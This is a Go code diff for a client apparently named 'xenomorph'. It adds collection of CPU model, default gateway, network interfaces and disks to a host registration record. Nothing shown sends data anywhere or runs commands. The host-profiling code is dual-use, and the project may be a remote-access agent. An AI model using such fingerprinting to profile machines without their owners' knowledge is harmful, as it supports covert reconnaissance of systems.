@@ -4,12 +4,12 @@ import (
 	"os"
 	"runtime"
 
-	"github.com/codevault-llc/xenomorph-client/internal/services/network"
-	"github.com/codevault-llc/xenomorph-client/pkg/types"
+	"github.com/codevault-llc/xenomorph/internal/netclient/services/network"
+	"github.com/codevault-llc/xenomorph/pkg/types"
+	"github.com/codevault-llc/xenomorph/pkg/utils"
+	"github.com/shirou/gopsutil/cpu"
 	"github.com/shirou/gopsutil/host"
 	"github.com/shirou/gopsutil/mem"
-
-	"github.com/codevault-llc/xenomorph-client/pkg/utils"
 )
 
 func GetSystemInfo() types.RegistrationData {
@@ -32,11 +32,12 @@ func GetSystemInfo() types.RegistrationData {
 }
 
 func GetCPUModel() string {
-	return ""
-}
+	info, err := cpu.Info()
+	if err != nil || len(info) == 0 {
+		return "Unknown CPU"
+	}
 
-func GetGPUModel() string {
-	return ""
+	return info[0].ModelName
 }
 
 func Info() types.RegistrationData {
@@ -67,6 +68,22 @@ func Info() types.RegistrationData {
 	
 	subnetMask, _ := network.GetSubnetMask()
 	info.SubnetMask = subnetMask
+
+	gateway, err := network.GetDefaultGateway()
+	if err != nil {
+		info.Gateway = "Unknown"
+	} else {
+		info.Gateway = gateway
+	}
+
+	interfaces, err := network.GetNetworkInterfaces()
+	if err != nil {
+		info.NetworkInterfaces = []types.NetworkInterface{}
+	} else {
+		info.NetworkInterfaces = interfaces
+	}
+
+	info.Disks, _ = GetDisks()
 
 	return info
 }
